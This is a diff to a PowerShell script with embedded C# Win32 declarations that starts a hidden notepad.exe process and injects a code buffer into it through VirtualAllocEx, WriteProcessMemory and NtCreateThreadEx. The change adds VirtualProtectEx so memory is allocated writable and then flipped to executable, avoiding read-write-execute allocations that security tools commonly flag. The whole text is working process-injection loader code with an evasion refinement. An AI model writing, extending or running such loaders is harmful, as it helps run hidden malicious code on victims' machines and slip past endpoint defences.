@@ -317,6 +317,8 @@ public class Win32 {
     [DllImport("kernel32.dll")]
     public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
     [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+    [DllImport("kernel32.dll")]
     public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref UInt32 lpNumberOfBytesWritten);
     [DllImport("kernel32.dll")]
     public static extern bool CloseHandle(IntPtr hObject);
@@ -340,8 +342,9 @@ public class Win32 {
     $procStart.Properties["ShowWindow"].Value = 0
     $procID = (([wmiclass]"\\.\root\cimv2:Win32_Process").Create("notepad.exe", $null, $procStart)).ProcessId
     $hProc = [Win32]::OpenProcess(0x001F0FFF, $false, $procID)
-    $address = [Win32]::VirtualAllocEx($hProc, 0, $Code.Length + 1, 0x3000, 0x40)
+    $address = [Win32]::VirtualAllocEx($hProc, 0, $Code.Length + 1, 0x1000 -bor 0x2000, 0x04)
     [Win32]::WriteProcessMemory($hProc, $address, $Code, $Code.Length, [ref] 0) | Out-Null
+    [Win32]::VirtualProtectEx($hProc, $address, $Code.Length, 0x20, [ref] 0) | Out-Null
     $hRemoteThread = [IntPtr]::Zero
     [Win32]::NtCreateThreadEx([ref]$hRemoteThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $address, [IntPtr]::Zero, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) | Out-Null
     if ($hRemoteThread -ne [IntPtr]::Zero) {
